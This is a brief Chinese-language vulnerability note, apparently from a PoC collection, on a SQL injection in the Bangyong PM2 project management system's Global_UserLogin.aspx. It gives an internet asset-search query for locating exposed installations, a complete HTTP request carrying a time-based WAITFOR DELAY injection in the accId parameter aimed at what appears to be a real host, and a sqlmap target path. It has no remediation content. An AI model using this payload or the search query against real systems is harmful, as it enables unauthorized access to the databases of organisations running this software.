# 邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞

# 一、漏洞简介
邦永PM2项目管理系统Global_UserLogin.aspx SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 邦永PM2项目管理系统

# 三、资产测绘
+ hunter`web.body="PM2项目管理系统BS版增强工具.zip"`
+ 特征

![1701347452885-d3cea2a7-432e-40cc-9a7d-3f38f56de6e5.png](./img/rcZ2NB48Dm1SUHjI/1701347452885-d3cea2a7-432e-40cc-9a7d-3f38f56de6e5-486911.png)

# 四、漏洞复现
```plain
GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: pm2.sunwayopto.cn:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1701348148996-78c9e2ba-9e67-47d4-9660-f03ef1fc5448.png](./img/rcZ2NB48Dm1SUHjI/1701348148996-78c9e2ba-9e67-47d4-9660-f03ef1fc5448-854696.png)

sqlmap

```plain
/Global/Global_UserLogin.aspx?accId=1
```

![1701348163542-81132564-5077-4727-9372-c4579e401148.png](./img/rcZ2NB48Dm1SUHjI/1701348163542-81132564-5077-4727-9372-c4579e401148-428762.png)



> 更新: 2024-02-29 23:55:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vcx1cgrng7y325mg>